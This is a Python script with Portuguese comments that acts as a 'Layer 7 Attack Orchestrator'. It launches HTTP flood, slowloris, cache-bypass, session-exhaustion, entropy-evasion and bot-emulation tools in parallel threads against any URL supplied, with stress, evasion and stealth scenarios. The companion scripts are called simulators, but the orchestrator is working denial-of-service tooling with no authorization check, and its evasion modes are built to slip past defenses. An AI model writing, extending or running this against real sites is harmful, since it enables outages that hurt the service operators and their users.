#!/usr/bin/env python3
import sys
import argparse
import subprocess
import threading
import time
import os

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

SCRIPTS = {
    "flood": "http_flood_simulator.py",
    "slowloris": "slowloris_simulator.py",
    "api_abuse": "api_abuse_simulator.py",
    "session": "session_exhaustion_simulator.py",
    "bot": "bot_behavior_emulator.py",
    "distributed": "distributed_pattern_simulator.py",
    "entropy": "request_entropy_attack_simulator.py",
    "cache": "cache_bypass_simulator.py"
}

active_processes = []

def run_tool(script_name, args):
    try:
        cmd = [sys.executable, script_name] + args
        print(f"{Colors.OKBLUE}Iniciando: {script_name} com args: {args}{Colors.ENDC}")
        # Redirecionar stdout/stderr para devnull para não poluir o orquestrador,
        # ou logar em arquivo. Vamos logar em arquivos separados.
        log_file = open(f"logs_{script_name}.log", "w")
        p = subprocess.Popen(cmd, stdout=log_file, stderr=log_file)
        active_processes.append(p)
        p.wait()
        log_file.close()
    except Exception as e:
        print(f"{Colors.FAIL}Erro ao executar {script_name}: {e}{Colors.ENDC}")

def main():
    parser = argparse.ArgumentParser(description="Orquestrador de Ataques Layer 7")
    parser.add_argument("url", help="URL alvo principal")
    parser.add_argument("--scenario", choices=["all", "stress", "evasion", "stealth"], default="stress", help="Cenário de ataque")
    parser.add_argument("--duration", type=int, default=60, help="Duração global (s)")

    args = parser.parse_args()

    # Determinar caminho absoluto dos scripts
    base_dir = os.path.dirname(os.path.abspath(__file__))

    targets = []

    print(f"{Colors.HEADER}=== Layer 7 Attack Orchestrator ==={Colors.ENDC}")
    print(f"Alvo: {args.url}")
    print(f"Cenário: {args.scenario.upper()}")
    print(f"Logs serão salvos em arquivos logs_*.log locais.")

    if args.scenario == "stress":
        # Flood + Cache Bypass
        targets.append(("flood", ["--threads", "10", "--duration", str(args.duration)]))
        targets.append(("cache", ["--threads", "10", "--duration", str(args.duration)]))

    elif args.scenario == "evasion":
        # Entropy + Distributed + Cache
        targets.append(("entropy", ["--threads", "5", "--duration", str(args.duration)]))
        targets.append(("distributed", ["--threads", "5", "--duration", str(args.duration)]))
        targets.append(("cache", ["--threads", "5", "--duration", str(args.duration)]))

    elif args.scenario == "stealth":
        # Slowloris + Bot Behavior
        targets.append(("slowloris", ["--sockets", "100", "--sleeptime", "10"])) # Slowloris duration is loop based, let's kill it later
        targets.append(("bot", ["--threads", "2", "--min-delay", "2", "--max-delay", "10", "--duration", str(args.duration)]))

    elif args.scenario == "all":
        # Tudo (Cuidado!)
        for key in SCRIPTS:
            if key == "slowloris":
                 targets.append((key, ["--sockets", "50"]))
            else:
                 targets.append((key, ["--threads", "2", "--duration", str(args.duration)]))

    threads = []
    for t_key, t_args in targets:
        script_path = os.path.join(base_dir, SCRIPTS[t_key])

        # Adicionar URL aos argumentos (exceto slowloris que pede host)
        # Slowloris precisa de host limpo e porta separada.
        # Vamos fazer um parse simples da URL para slowloris
        if t_key == "slowloris":
            try:
                from urllib.parse import urlparse
                parsed = urlparse(args.url)
                host = parsed.hostname
                port = str(parsed.port) if parsed.port else ("443" if parsed.scheme == "https" else "80")
                https_arg = ["--https"] if parsed.scheme == "https" else []
                final_args = [host, "--port", port] + https_arg + t_args
            except:
                print(f"Pular slowloris (falha parse URL)")
                continue
        else:
            final_args = [args.url] + t_args

        t = threading.Thread(target=run_tool, args=(script_path, final_args))
        t.start()
        threads.append(t)

    print(f"{Colors.OKGREEN}Ataques iniciados em background. Aguardando {args.duration}s...{Colors.ENDC}")

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print("\nInterrompendo...")

    print("Finalizando processos filhos...")
    for p in active_processes:
        p.terminate()

    print("Concluído.")

if __name__ == "__main__":
    main()
